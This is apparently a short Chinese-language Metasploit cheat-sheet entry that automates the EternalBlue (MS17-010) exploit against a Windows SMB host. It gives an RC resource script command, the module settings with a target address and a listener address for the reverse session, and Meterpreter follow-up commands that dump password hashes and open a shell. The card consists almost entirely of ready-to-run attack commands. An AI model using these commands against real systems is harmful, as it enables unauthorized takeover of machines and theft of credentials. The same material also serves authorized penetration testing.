### Metasploit

| 属性 | 值 |
|------|-----|
| 版本 | 6.x |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `漏洞利用` `自动化` `MSF` |

## MSF 自动化执行永恒之蓝

### 执行 RC 资源脚本
```bash
msfconsole -r metasploit_ms17010.rc
```

### 脚本内部配置示例
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
set LHOST 10.10.10.10
```

### 获取 Meterpreter 后执行操作
```bash
meterpreter > hashdump
meterpreter > shell
```

- ✓ 一键自动化加载模块和载荷
- ✓ 直接获取高权限的 Meterpreter 会话
- 适合快速漏洞验证
